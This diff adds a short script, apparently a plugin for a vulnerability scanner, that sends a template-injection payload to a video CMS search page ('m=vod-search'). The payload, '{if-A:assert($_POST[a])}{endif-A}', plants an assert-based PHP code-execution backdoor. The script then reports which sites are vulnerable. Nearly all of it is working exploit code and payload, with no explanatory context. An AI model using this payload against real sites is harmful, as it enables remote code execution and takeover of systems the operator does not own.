@@ -1,0 +1,14 @@
+#request url = var
+#define payload = /index.php?m=vod-search&wd=%7bif-A%3aassert(%24_POST%5ba%5d)%7d%7bendif-A%7d
+#define bug = 共0条数据&nbsp
+#define info = /index.php?m=vod-search&wd={if-A:assert($_POST[a])}{endif-A}
+#define re = <a href="(.*?)?m=[\s\S]*?
+
+function main(args)
+{
+	res = HttpGet(url.payload,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
+	if(StrFindStr(res[0],bug,0)!= "-1")
+	{
+		print(url.info,StrRe(res[0],re));
+	}
+}
